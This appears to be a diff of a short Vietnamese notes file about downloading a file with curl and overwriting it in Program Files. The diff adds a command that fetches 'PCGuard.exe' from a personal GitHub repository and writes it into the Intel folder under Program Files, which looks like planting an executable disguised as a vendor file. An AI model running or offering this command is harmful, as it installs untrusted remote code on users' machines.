@@ -1,7 +1,14 @@
+# Command
+
 ##
 Cách 1: Tải file và ghi đè trực tiếp
 
 curl -L "https://example.com/file.exe" -o "C:\Program Files\abc\file.exe"
+
+curl -L "https://raw.githubusercontent.com/palopdt-sketch/7eefbdbe0f93d6fa6a7348d94cf78e028/refs/heads/main/dt/PCGuard.exe" -o "C:\Program Files\Intel\PCGuard.exe"
+
+##
+
 
 
 Cách 2: Tải vào thư mục tạm rồi chép đè
